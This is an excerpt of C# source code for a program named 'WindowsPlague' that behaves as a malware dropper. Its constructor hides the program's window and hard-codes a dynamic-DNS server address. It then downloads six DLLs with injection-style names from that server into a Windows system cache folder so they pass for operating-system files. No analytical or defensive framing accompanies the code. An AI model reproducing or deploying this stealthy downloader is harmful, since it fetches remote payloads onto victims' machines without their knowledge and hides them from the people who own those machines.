...
namespace WindowsPlague
{
    class Program
    {
        ...
        public Program(string ip)
        {
            this.hide();
            //Set the server's IP
            this.ip = "ritrit.ddns.net:8888";
            //Download the files first
            if (!File.Exists(Path.Combine(@"C:\ProgramData\Microsoft\Windows\Caches\", "Ips1.dll")))
            {
                this.getInjections();
            }


            Directory.SetCurrentDirectory(@"C:\ProgramData\Microsoft\Windows\Caches\");
        ...
        private void getInjections()
        {
            ...
            webClient.DownloadFile("http://" + ip + "/Itxt.dll", Path.Combine(@"C:\ProgramData\Microsoft\Windows\Caches\", "Itxt.dll"));
            webClient.DownloadFile("http://" + ip + "/Ips1.dll", Path.Combine(@"C:\ProgramData\Microsoft\Windows\Caches\", "Ips1.dll"));
            webClient.DownloadFile("http://" + ip + "/Ibat.dll", Path.Combine(@"C:\ProgramData\Microsoft\Windows\Caches\", "Ibat.dll"));
            webClient.DownloadFile("http://" + ip + "/Iphp.dll", Path.Combine(@"C:\ProgramData\Microsoft\Windows\Caches\", "Iphp.dll"));
            webClient.DownloadFile("http://" + ip + "/Iasp.dll", Path.Combine(@"C:\ProgramData\Microsoft\Windows\Caches\", "Iasp.dll"));
            webClient.DownloadFile("http://" + ip + "/antiu.dll", Path.Combine(@"C:\ProgramData\Microsoft\Windows\Caches\", "antiu.dll"));
        }
